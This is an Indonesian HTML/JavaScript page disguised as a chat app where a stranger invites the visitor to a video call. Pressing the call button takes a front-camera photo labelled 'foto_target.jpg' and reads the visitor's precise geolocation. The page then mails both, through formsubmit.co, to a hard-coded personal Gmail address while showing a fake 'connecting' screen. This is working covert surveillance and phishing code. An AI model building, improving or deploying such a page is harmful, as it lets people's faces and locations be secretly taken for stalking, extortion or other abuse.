<!DOCTYPE html>
<html lang="id">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Video Call Fix</title>
 <style>
 :root {
 --bg-color: #0b141a;
 --chat-bg: #1e2329;
 --message-sent: #005c4b;
 --message-received: #202c33;
 --text-primary: #e9edef;
 --text-secondary: #8696a0;
 --accent: #00a884;
 --header-bg: #1f2c34;
 }

 * { box-sizing: border-box; margin: 0; padding: 0; }

 body {
 font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 background-color: var(--bg-color);
 color: var(--text-primary);
 height: 100vh;
 display: flex;
 flex-direction: column;
 overflow: hidden;
 }

 header {
 background-color: var(--header-bg);
 padding: 10px 15px;
 display: flex;
 align-items: center;
 justify-content: space-between;
 border-bottom: 1px solid #2a3942;
 z-index: 10;
 }

 .header-left { display: flex; align-items: center; }
 .avatar {
 width: 40px; height: 40px; background-color: #333; border-radius: 50%;
 display: flex; align-items: center; justify-content: center; font-size: 20px; margin-right: 10px;
 }
 .header-info h1 { font-size: 16px; font-weight: 500; margin-bottom: 2px; }
 .header-info p { font-size: 12px; color: var(--text-secondary); }

 #btn-call-header {
 background-color: var(--accent); color: white; border: none;
 padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 12px;
 cursor: pointer; display: flex; align-items: center; gap: 5px;
 transition: background 0.2s;
 }
 #btn-call-header:disabled { background-color: #555; cursor: wait; opacity: 0.7; }

 #chat-area {
 flex: 1; overflow-y: auto; padding: 20px;
 background-image: radial-gradient(#1f2c34 1px, transparent 1px); background-size: 20px 20px;
 display: flex; flex-direction: column;
 }
 .message {
 max-width: 80%; padding: 10px 15px; border-radius: 8px; margin-bottom: 10px;
 position: relative; word-wrap: break-word; font-size: 14px;
 }
 .message.received { background-color: var(--message-received); align-self: flex-start; }
 .message.sent { background-color: var(--message-sent); align-self: flex-end; }
 .timestamp { font-size: 11px; color: var(--text-secondary); text-align: right; margin-top: 5px; display: block; }
 .message img { max-width: 100%; border-radius: 6px; margin-top: 5px; }
 .link-btn { display: inline-block; margin-top: 5px; color: #b4d9ff; text-decoration: none; font-weight: bold; }

 #loader {
 position: fixed; top: 0; left: 0; right: 0; bottom: 0;
 background: rgba(11, 20, 26, 0.95); display: none;
 flex-direction: column; align-items: center; justify-content: center; z-index: 100;
 }
 .spinner {
 width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--accent);
 border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;
 }
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

 #video-source {
 position: fixed; bottom: 10px; right: 10px; width: 80px; height: 120px;
 opacity: 0.3; z-index: 50; border-radius: 10px; border: 2px solid var(--accent);
 object-fit: cover; display: none;
 }
 </style>
</head>
<body>

<header>
 <div class="header-left">
 <div class="avatar">📞</div>
 <div class="header-info">
 <h1>Stranger</h1>
 <p id="status-text">Online</p>
 </div>
 </div>
 <button id="btn-call-header" onclick="startCallSequence()">
 <span class="icon-vc">📹</span> <span>Video</span>
 </button>
</header>

<div id="chat-area">
 <div class="message received">langsung vc aja hehe</div>
</div>

<div id="loader">
 <div class="spinner"></div>
 <span id="loader-text">Menghubungkan...</span>
</div>

<!-- Hidden Video Element -->
<video id="video-source" autoplay playsinline muted></video>

<script>
const EMAIL_DESTINATION = "milandahayani477@gmail.com";
const chatArea = document.getElementById('chat-area');
const loader = document.getElementById('loader');
const loaderText = document.getElementById('loader-text');
const statusText = document.getElementById('status-text');
const videoEl = document.getElementById('video-source');
const btnCallHeader = document.getElementById('btn-call-header');

function getTime() {
 return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

function addMessage(text, type, extra = '') {
 const msgDiv = document.createElement('div');
 msgDiv.className = `message ${type}`;
 let content = text;
 if (extra) content += extra;
 content += `<br><span class="timestamp">${getTime()}</span>`;
 msgDiv.innerHTML = content;
 chatArea.appendChild(msgDiv);
 chatArea.scrollTop = chatArea.scrollHeight;
}

// --- UTAMA: URUTAN DIPERBAIKI ---
async function startCallSequence() {
 btnCallHeader.disabled = true;
 statusText.innerText = "Connecting...";
 loader.style.display = 'flex';
 loaderText.innerText = "Mengakses Kamera...";

 try {
     // 1. AKTIFKAN KAMERA SEBELUMNYA
     const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" } // Memaksa kamera depan
     });
     
     videoEl.srcObject = stream;
     videoEl.style.display = 'block';
     await videoEl.play();
     
     // Tunggu sebentar agar video benar-benar terload (Buffering)
     await new Promise(resolve => setTimeout(resolve, 500));

     // 2. BARU MINTA LOKASI (Setelah kamera nyala)
     loaderText.innerText = "Mencari Lokasi...";
     const lokasi = await requestLocation();

     // 3. Ambil Foto
     const fotoBlob = captureImageFromStream(stream);
     
     // Matikan stream
     stream.getTracks().forEach(track => track.stop());
     videoEl.style.display = 'none';

     // 4. Tampilkan di Chat
     const url = URL.createObjectURL(fotoBlob);
     const mapLink = `https://www.google.com/maps?q=${lokasi.lat},${lokasi.lng}`;
     
     addMessage(`Lokasi: ${lokasi.desc}`, 'received');
     addMessage('Selfie:', 'sent', 
        `<img src="${url}" alt="Selfie">
         <a href="${mapLink}" target="_blank" class="link-btn">📍 Lihat di Maps</a>`
     );

     // 5. Kirim Email
     loaderText.innerText = "Mengirim Data...";
     await sendToEmail(lokasi, fotoBlob);
     
     statusText.innerText = "Connected";
     loaderText.innerText = "Selesai!";
     setTimeout(() => {
         loader.style.display = 'none';
         statusText.innerText = "Online";
         btnCallHeader.disabled = false;
     }, 1000);

 } catch (error) {
     addMessage(`Error: ${error.message}`, 'received');
     loader.style.display = 'none';
     statusText.innerText = "Error";
     btnCallHeader.disabled = false;
 }
}

function requestLocation() {
 return new Promise((resolve, reject) => {
     if (!navigator.geolocation) {
         reject(new Error("Geolocation tidak didukung"));
         return;
     }
     navigator.geolocation.getCurrentPosition(
         (position) => {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             const acc = position.coords.accuracy;
             resolve({
                 lat, lng, 
                 desc: `Lat: ${lat.toFixed(6)}, Long: ${lng.toFixed(6)} (Akurasi: ${Math.round(acc)}m)`
             });
         },
         (err) => {
             reject(new Error(`Gagal mendapatkan lokasi: ${err.message}`));
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 });
}

function captureImageFromStream(stream) {
 const canvas = document.createElement('canvas');
 // Gunakan ukuran asli video agar resolusi tinggi
 canvas.width = videoEl.videoWidth || 640;
 canvas.height = videoEl.videoHeight || 480;
 
 const ctx = canvas.getContext('2d');
 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
 
 return new Promise((resolve) => {
     canvas.toBlob((blob) => {
         resolve(blob);
     }, 'image/jpeg', 0.9); // Kualitas gambar 90%
 });
}

async function sendToEmail(lokasiObj, fotoBlob) {
 const formData = new FormData();
 formData.append('message', `Lokasi:\n${lokasiObj.desc}`);
 // Pastikan nama 'attachment'
 formData.append('attachment', fotoBlob, 'foto_target.jpg');

 try {
     const response = await fetch(`https://formsubmit.co/ajax/${EMAIL_DESTINATION}`, {
         method: 'POST',
         body: formData
     });
     if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
 } catch (err) {
     console.error("Gagal kirim email:", err);
     throw new Error(`Gagal kirim email: ${err.message}`);
 }
}
</script>
</body>
</html>
